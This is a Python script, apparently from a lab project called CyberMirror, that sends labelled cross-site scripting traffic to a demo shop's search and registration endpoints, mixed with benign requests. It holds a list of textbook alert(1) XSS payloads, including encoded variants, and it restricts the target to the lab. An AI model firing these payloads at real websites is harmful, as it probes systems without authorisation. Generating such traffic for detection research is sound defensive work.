"""Send harmless textbook XSS payloads (lab only) to CyberMirror."""
from __future__ import annotations

import argparse
import random
import sys
import time
from collections import Counter
from typing import Optional
from urllib.parse import quote

import requests

try:
    from attacker.events import (
        add_events_arg,
        close_events,
        configure_events,
        emit,
        vuln_for,
    )
    from attacker.normal_traffic import DEFAULT_BASE_URL, assert_safe_base_url
except ImportError:
    from events import (
        add_events_arg,
        close_events,
        configure_events,
        emit,
        vuln_for,
    )
    from normal_traffic import DEFAULT_BASE_URL, assert_safe_base_url

ATTACK_LABEL = "xss"
NORMAL_LABEL = "normal"

# Harmless textbook XSS payloads only (alert(1) style — no real exploit kit)
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    '"><script>alert(1)</script>',
    "<iframe src=javascript:alert(1)>",
    "<math><mtext></math><script>alert(1)</script>",
    # Encoded variants
    "%3Cscript%3Ealert(1)%3C/script%3E",
    quote("<script>alert(1)</script>"),
    quote("<img src=x onerror=alert(1)>"),
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
]

NORMAL_INPUTS = [
    "alice.demo",
    "alice.demo@example.com",
    "laptop",
    "john smith",
    "quarterly report",
    "office chair",
]


def _delay() -> None:
    time.sleep(random.uniform(0.03, 0.18))


def _send(
    session: requests.Session,
    method: str,
    url: str,
    *,
    label: str,
    counts: Counter,
    action: Optional[str] = None,
    command: Optional[str] = None,
    **kwargs,
) -> requests.Response:
    headers = dict(kwargs.pop("headers", {}) or {})
    headers["X-Test-Label"] = label
    kwargs.setdefault("timeout", 20)
    kwargs.setdefault("allow_redirects", False)
    t0 = time.perf_counter()
    response = session.request(method, url, headers=headers, **kwargs)
    duration_ms = (time.perf_counter() - t0) * 1000.0
    counts[response.status_code] += 1
    emit(
        "result",
        command=command,
        action=action or f"{method} {url}",
        log=f"{method} {url} → {response.status_code} (label={label})",
        result={
            "method": method,
            "url": url,
            "status_code": response.status_code,
            "label": label,
        },
        vulnerability=vuln_for(label),
        edge={"from": "attacker", "to": "orbitmart", "label": label},
        status="ok" if response.status_code < 500 else "error",
        duration_ms=round(duration_ms, 2),
    )
    _delay()
    return response


def run(base_url: str) -> tuple[Counter, Counter]:
    assert_safe_base_url(base_url)
    base = base_url.rstrip("/")
    attack_counts: Counter = Counter()
    normal_counts: Counter = Counter()
    session = requests.Session()
    session.headers["User-Agent"] = "CyberMirror-XSSAttack/1.0 (+lab)"

    print(f"Target: {base}")
    print(f"XSS payloads: {len(XSS_PAYLOADS)}")
    print(f"Normal inputs: {len(NORMAL_INPUTS)}")
    print()

    emit(
        "log",
        log=f"XSS payloads={len(XSS_PAYLOADS)}; normal inputs={len(NORMAL_INPUTS)}",
        vulnerability=vuln_for("xss"),
    )

    for payload in XSS_PAYLOADS:
        cmd = f"GET /search?q={payload!r}"
        print(f"[xss] search q={payload!r}")
        emit(
            "command",
            command=cmd,
            action="XSS catalog search",
            log=f"[xss] search q={payload!r}",
            vulnerability=vuln_for("xss"),
            edge={"from": "attacker", "to": "orbitmart", "label": "xss"},
        )
        _send(
            session,
            "GET",
            f"{base}/search",
            label=ATTACK_LABEL,
            counts=attack_counts,
            command=cmd,
            action="XSS catalog search",
            params={"q": payload},
        )

        # Register fields (username / email) — password avoided on purpose
        uname = f"xss_{abs(hash(payload)) % 10_000}"
        print(f"[xss] register username/email payload")
        emit(
            "command",
            command="POST /register (username|email XSS)",
            action="XSS in register fields",
            log="[xss] register username/email payload",
            vulnerability=vuln_for("xss"),
        )
        _send(
            session,
            "POST",
            f"{base}/register",
            label=ATTACK_LABEL,
            counts=attack_counts,
            command="POST /register username=XSS",
            action="XSS in register username",
            data={
                "username": payload[:80],
                "email": f"{uname}@example.com",
                "password": "XssLabPass123!",
            },
        )
        _send(
            session,
            "POST",
            f"{base}/register",
            label=ATTACK_LABEL,
            counts=attack_counts,
            command="POST /register email=XSS",
            action="XSS in register email",
            data={
                "username": uname,
                "email": payload[:120],
                "password": "XssLabPass123!",
            },
        )

    for term in NORMAL_INPUTS:
        print(f"[normal] search/register {term!r}")
        emit(
            "command",
            command=f"GET /search?q={term!r}",
            action="Benign search/register",
            log=f"[normal] search/register {term!r}",
            vulnerability=vuln_for("normal"),
        )
        _send(
            session,
            "GET",
            f"{base}/search",
            label=NORMAL_LABEL,
            counts=normal_counts,
            command=f"GET /search?q={term!r}",
            action="Benign catalog search",
            params={"q": term},
        )
        _send(
            session,
            "POST",
            f"{base}/register",
            label=NORMAL_LABEL,
            counts=normal_counts,
            command="POST /register (benign)",
            action="Benign register",
            data={
                "username": term.replace(" ", ".")[:40] or "normal.user",
                "email": f"{term.replace(' ', '.')}@example.com"[:80],
                "password": "NormalPass123!",
            },
        )

    return attack_counts, normal_counts


def main(argv: Optional[list[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="Lab-only XSS traffic generator.")
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL)
    add_events_arg(parser)
    args = parser.parse_args(argv)
    configure_events(
        args.events_file,
        suite="xss",
        base_url=args.base_url,
        meta={"cli": "python -m attacker.xss_attack"},
    )
    emit(
        "command",
        command=f"python -m attacker.xss_attack --base-url {args.base_url}",
        action="Launch XSS attack suite",
        vulnerability=vuln_for("xss"),
    )
    try:
        attack_counts, normal_counts = run(args.base_url)
    except requests.RequestException as exc:
        print(f"Request failed: {exc}", file=sys.stderr)
        close_events(status="failed", score={"error": str(exc)})
        return 1

    print()
    print("=== Summary (X-Test-Label: xss) ===")
    print(f"Requests sent: {sum(attack_counts.values())}")
    for code in sorted(attack_counts):
        print(f"  {code}: {attack_counts[code]}")
    print()
    print("=== Summary (X-Test-Label: normal) ===")
    print(f"Requests sent: {sum(normal_counts.values())}")
    for code in sorted(normal_counts):
        print(f"  {code}: {normal_counts[code]}")

    score = {
        "attack_requests": sum(attack_counts.values()),
        "normal_requests": sum(normal_counts.values()),
        "attack_status_codes": dict(attack_counts),
        "normal_status_codes": dict(normal_counts),
        "outcome": "traffic_sent",
    }
    emit("score", score=score, action="XSS suite summary", status="completed")
    close_events(status="completed", score=score)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
